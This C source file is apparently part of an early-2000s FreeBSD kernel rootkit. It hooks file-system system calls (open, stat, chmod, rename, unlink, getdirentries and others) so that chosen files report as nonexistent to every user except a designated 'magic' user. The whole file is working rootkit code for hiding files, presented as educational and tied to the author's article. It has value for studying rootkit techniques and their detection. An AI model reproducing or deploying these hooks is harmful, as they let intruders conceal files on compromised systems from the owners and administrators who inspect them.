/*
 * Copyright (c) 2001, Stephanie Wehner <atrak@itsx.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The names of its contributors may be used to endorse or promote products 
 *    derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 *    $Id: file-sysc.c,v 1.1.1.1 2001/08/06 12:02:06 atrak Exp $
 *
 *    This file contains a collection of file system related syscall
 *    to hide a file. Check out my article for more info.
 *
 *    This stuff was written for educational purposes only. All replacements
 *    in this section are quite easy. In every case, check if the supplied
 *    filename should be hidden or not. If it should be hidden, return not
 *    found right away, otherwise call the original system call.
 *    Only getdirentries is a bit more effort (see below)
 *
 *    Also, this most likely doesn't cover all calls to a hidden file
 *    so you've been warned :)
 */

#include <sys/types.h>
#include <sys/systm.h>
#include <sys/errno.h>
#include <sys/param.h>
#include <sys/sysproto.h>
#include <sys/kernel.h>
#include <sys/sysent.h>
#include <sys/syslimits.h>
#include <sys/proc.h>
#include <sys/malloc.h>
#include <sys/mbuf.h>
#include <dirent.h>

#include "../config.h"

#ifdef FILE_SYSCALLS

#include "util.h"
#include "control.h"

int new_open(struct proc *, register struct open_args *);
int new_stat(struct proc *, register struct stat_args *);
int new_lstat(struct proc *, register struct lstat_args *);
int new_chflags(struct proc *, register struct chflags_args *);
int new_chmod(struct proc *, register struct chmod_args *);
int new_chown(struct proc *, register struct chown_args *);
int new_utimes(struct proc *, register struct utimes_args *);
int new_truncate(struct proc *, register struct truncate_args *);
int new_rename(struct proc *, register struct rename_args *);
int new_unlink(struct proc *, register struct unlink_args *);
int new_getdirentries(struct proc *, register struct getdirentries_args *);

MALLOC_DEFINE(M_NEW_DIR, "dir", "struct");

/* 
 *    open replacement 
 */

int
new_open(struct proc *p, register struct open_args *uap)
{
    char name[NAME_MAX];
    size_t size;

    /* get the supplied arguments from userspace */	
    if(copyinstr(uap->path, name, NAME_MAX, &size) == EFAULT)
        return(EFAULT);

    /* if the entry should be hidden and the user is not magic, return not found */
    if(file_hidden(name) && !(is_magic_user(p->p_cred->pc_ucred->cr_uid)))
        return(ENOENT);
	
    return(open(p,uap));
}

/*
 *    stat replacement
 */

int 
new_stat(struct proc *p, register struct stat_args *uap)
{
    char name[NAME_MAX];
    size_t size;

    /* get the supplied arguments from userspace */	
    if(copyinstr(uap->path, name, NAME_MAX, &size) == EFAULT)
        return(EFAULT);

    /* if the entry should be hidden and the user is not magic, return not found */
    if(file_hidden(name) && !(is_magic_user(p->p_cred->pc_ucred->cr_uid)))
        return(ENOENT);

    return(stat(p,uap));
}

/*
 *    lstat replacement
 */

int
new_lstat(struct proc *p, register struct lstat_args *uap)
{
    char name[NAME_MAX];
    size_t size;

    if(copyinstr(uap->path, name, NAME_MAX, &size) == EFAULT)
        return(EFAULT);

    if(file_hidden(name) && !(is_magic_user(p->p_cred->pc_ucred->cr_uid)))
        return(ENOENT);

    return(lstat(p,uap));
}


/*
 *    chflags replacement
 */

int
new_chflags(struct proc *p, register struct chflags_args *uap)
{
    char name[NAME_MAX];
    size_t size;

    if(copyinstr(uap->path, name, NAME_MAX, &size) == EFAULT)
        return(EFAULT);

    if(file_hidden(name) && !(is_magic_user(p->p_cred->pc_ucred->cr_uid)))
        return(ENOENT);

    return(chflags(p,uap));
}

/*
 *    chmod replacement
 */
    
int
new_chmod(struct proc *p, register struct chmod_args *uap)
{
    char name[NAME_MAX];
    size_t size;
   
    if(copyinstr(uap->path, name, NAME_MAX, &size) == EFAULT)
        return(EFAULT);

    if(file_hidden(name) && !(is_magic_user(p->p_cred->pc_ucred->cr_uid)))
        return(ENOENT);

    return(chmod(p,uap));
}

/*
 *    chown replacement
 */
   
int
new_chown(struct proc *p, register struct chown_args *uap)
{
    char name[NAME_MAX];
    size_t size;
   
    if(copyinstr(uap->path, name, NAME_MAX, &size) == EFAULT)
        return(EFAULT);
    
    if(file_hidden(name) && !(is_magic_user(p->p_cred->pc_ucred->cr_uid)))
        return(ENOENT);

    return(chown(p,uap));
}

/*
 *    utimes replacement
 */

int
new_utimes(struct proc *p, register struct utimes_args *uap)
{
    char name[NAME_MAX];
    size_t size;
  
    if(copyinstr(uap->path, name, NAME_MAX, &size) == EFAULT)
        return(EFAULT); 
   
    if(file_hidden(name) && !(is_magic_user(p->p_cred->pc_ucred->cr_uid)))
        return(ENOENT);

    return(utimes(p,uap));
}

/*
 *    truncate replacement
 */

int
new_truncate(struct proc *p, register struct truncate_args *uap)
{
    char name[NAME_MAX];
    size_t size;
 
    if(copyinstr(uap->path, name, NAME_MAX, &size) == EFAULT)
        return(EFAULT);
   
    if(file_hidden(name) && !(is_magic_user(p->p_cred->pc_ucred->cr_uid)))
        return(ENOENT);

    return(truncate(p,uap));
}

/*
 *    rename replacement
 */

int
new_rename(struct proc *p, register struct rename_args *uap)
{
    char name[NAME_MAX];
    size_t size;

    if(copyinstr(uap->from, name, NAME_MAX, &size) == EFAULT)
        return(EFAULT);
  
    if(file_hidden(name) && !(is_magic_user(p->p_cred->pc_ucred->cr_uid)))
        return(ENOENT);

    return(rename(p,uap));
}


/*
 *    unlink replacement
 */

int 
new_unlink(struct proc *p, register struct unlink_args *uap)
{
    char name[NAME_MAX];
    size_t size;

    if(copyinstr(uap->path, name, NAME_MAX, &size) == EFAULT)
        return(EFAULT);

    if(file_hidden(name) && !(is_magic_user(p->p_cred->pc_ucred->cr_uid)))
        return(ENOENT);

    return(unlink(p,uap));
}


/*
 *    getdirentries replacement
 *
 *    this is called when a user requests a whole directory listing
 */

int
new_getdirentries(struct proc *p, register struct getdirentries_args *uap)
{
	int size, count;
	struct dirent *current, *dir;

	/* issue the standard system call */
	getdirentries(p, uap);

	/* if it succeeded, cut the hidden entries out of the result */
	size = p->p_retval[0];
	
	if(size > 0) {
		
		/* allocate memory */
		MALLOC(dir, struct dirent *, size, M_NEW_DIR, M_NOWAIT);
		
		/* copy the dirent structure back to kernel space */
		copyin(uap->buf, dir, size);

		/* check all records if they need to be hidden */
		current = dir;
		count = size;
			
		while((current->d_reclen != 0) && (count > 0)) {
			
			count -= current->d_reclen;

			if(file_hidden(current->d_name) && 
			    !(is_magic_user(p->p_cred->pc_ucred->cr_uid))) {
				
				/* cut it out */
				if(count != 0) 
					bcopy((char *)current + current->d_reclen, current, count);
	
				/* shorten list */
				size -= current->d_reclen;
			}

			/* advance to next record */
			if(count != 0) 
				current = (struct dirent *)((char *)current + current->d_reclen);
		}

		/* adjust return value to new size */
		p->p_retval[0] = size;

  		/*copy the whole (perhaps modified) memory back to the user buffer*/
  		copyout(dir, uap->buf, size);

  		/*free kernel memory*/
  		FREE(dir, M_NEW_DIR);
 	}

 	/*everything ok, so return 0*/
 	return(0);
}

#endif /* FILE_SYSCALLS */
